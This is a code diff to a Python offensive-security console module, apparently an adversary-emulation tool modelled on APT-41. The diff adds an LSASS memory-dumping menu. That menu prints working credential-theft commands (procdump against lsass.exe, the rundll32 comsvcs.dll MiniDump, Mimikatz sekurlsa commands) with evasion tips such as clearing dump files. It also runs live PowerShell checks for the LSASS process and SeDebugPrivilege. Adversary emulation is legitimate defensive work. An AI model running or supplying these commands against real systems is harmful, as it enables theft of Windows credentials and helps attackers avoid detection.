@@ -25,18 +25,19 @@ class IdentityModule:
             table.add_column("Option", style="cyan", width=3)
             table.add_column("Function", style="white")
             
-            table.add_row("1", "Local Credential Sources")
-            table.add_row("2", "Credential Store Access")
-            table.add_row("3", "Configuration Secrets")
-            table.add_row("4", "User Artifacts")
-            table.add_row("5", "Domain Context & Delegation")
-            table.add_row("6", "Token & Ticket Extraction")
+            table.add_row("1", "Local Credential Sources [APT-41: Credential Access]")
+            table.add_row("2", "Credential Store Access [APT-41: Credential Access]")
+            table.add_row("3", "Configuration Secrets [APT-41: Credential Access]")
+            table.add_row("4", "User Artifacts [APT-41: Credential Access]")
+            table.add_row("5", "Domain Context & Delegation [APT-41: Discovery]")
+            table.add_row("6", "Token & Ticket Extraction [APT-41: Credential Access]")
+            table.add_row("7", "LSASS Memory Dumping [APT-41: Credential Access]")
             table.add_row("0", "Return to main menu")
             
             console.print(table)
             console.print()
             
-            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6'], default='0')
+            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7'], default='0')
             
             if choice == '0':
                 break
@@ -52,12 +53,15 @@ class IdentityModule:
                 self._domain_context(console, session_data)
             elif choice == '6':
                 self._tokens_tickets(console, session_data)
+            elif choice == '7':
+                self._lsass_dumping(console, session_data)
             
             console.print()
     
     def _local_credentials(self, console: Console, session_data: dict):
-        """Explore local credential sources"""
-        console.print("\n[bold cyan]Local Credential Sources[/bold cyan]\n")
+        """Explore local credential sources - APT-41 TTP: Credential Access"""
+        console.print("\n[bold cyan]Local Credential Sources[/bold cyan]")
+        console.print("[dim]APT-41 TTP: T1003.001 (OS Credential Dumping: LSASS), T1003.002 (Security Account Manager)[/dim]\n")
         
         sources = {
             "Windows Credential Manager": [
@@ -292,7 +296,93 @@ class IdentityModule:
                 console.print(f"  • {tool}")
             console.print()
         
-        console.print("[bold]OPSEC Note:[/bold]")
+        console.print("[bold]APT-41 Credential Dumping Techniques:[/bold]")
+        apt41_methods = [
+            "Mimikatz for LSASS memory dumping",
+            "Procdump + Mimikatz offline analysis",
+            "Task Manager → Create dump file",
+            "Rundll32 with comsvcs.dll (MiniDump)",
+            "WDigest credential extraction"
+        ]
+        
+        for method in apt41_methods:
+            console.print(f"  • [yellow]{method}[/yellow]")
+        
+        console.print("\n[bold]OPSEC Note:[/bold]")
+        console.print("  • APT-41 uses legitimate tools when possible")
         console.print("  • Prefer token manipulation over credential extraction when possible")
         console.print("  • Use built-in Windows mechanisms (runas, etc.)")
         console.print("  • Minimize use of external tools")
+    
+    def _lsass_dumping(self, console: Console, session_data: dict):
+        """LSASS Memory Dumping - APT-41 TTP: Credential Access"""
+        console.print("\n[bold cyan]LSASS Memory Dumping[/bold cyan]")
+        console.print("[dim]APT-41 TTP: T1003.001 (OS Credential Dumping: LSASS Memory)[/dim]\n")
+        
+        lab_use = session_data.get('LAB_USE', 0)
+        is_live = lab_use != 1
+        
+        console.print("[bold]APT-41 LSASS Dumping Methods:[/bold]")
+        methods = {
+            "Procdump Method": [
+                "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+                "Download dump file",
+                "Analyze offline with Mimikatz",
+                "Less likely to trigger alerts"
+            ],
+            "Task Manager Method": [
+                "Open Task Manager",
+                "Right-click lsass.exe → Create dump file",
+                "Analyze dump with Mimikatz",
+                "Native Windows tool"
+            ],
+            "Rundll32 Method": [
+                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> lsass.dmp full",
+                "Built-in Windows DLL",
+                "No external tools required",
+                "Less suspicious"
+            ],
+            "Mimikatz Direct": [
+                "sekurlsa::logonpasswords",
+                "sekurlsa::wdigest",
+                "sekurlsa::tspkg",
+                "Direct memory access (higher risk)"
+            ]
+        }
+        
+        for method_name, steps in methods.items():
+            console.print(f"[bold]{method_name}:[/bold]")
+            for step in steps:
+                console.print(f"  • {step}")
+            console.print()
+        
+        console.print("[bold]APT-41 OPSEC Considerations:[/bold]")
+        opsec = [
+            "Use legitimate tools (procdump, taskmgr) when possible",
+            "Dump to disk and analyze offline",
+            "Avoid direct Mimikatz execution if possible",
+            "Clear dump files after extraction",
+            "Use encrypted channels for credential transfer"
+        ]
+        
+        for consideration in opsec:
+            console.print(f"  • [yellow]{consideration}[/yellow]")
+        
+        if is_live or Confirm.ask("\n[bold]Check LSASS process?[/bold]", default=False):
+            console.print("\n[yellow]Checking LSASS process...[/yellow]\n")
+            
+            # Check LSASS process
+            ps_cmd = "Get-Process lsass | Select-Object Id, ProcessName, Path, StartTime"
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
+            if exit_code == 0:
+                console.print(f"[green]LSASS Process:[/green]\n{stdout}")
+            else:
+                console.print(f"[red]Error:[/red] {stderr}")
+            
+            # Check for SeDebugPrivilege
+            ps_cmd = "whoami /priv | Select-String 'SeDebugPrivilege'"
+            exit_code, stdout, stderr = execute_cmd(ps_cmd, lab_use=lab_use)
+            if exit_code == 0 and stdout.strip():
+                console.print(f"[green]SeDebugPrivilege:[/green] Available")
+            else:
+                console.print("[yellow]SeDebugPrivilege:[/yellow] Not available (may need elevation)")
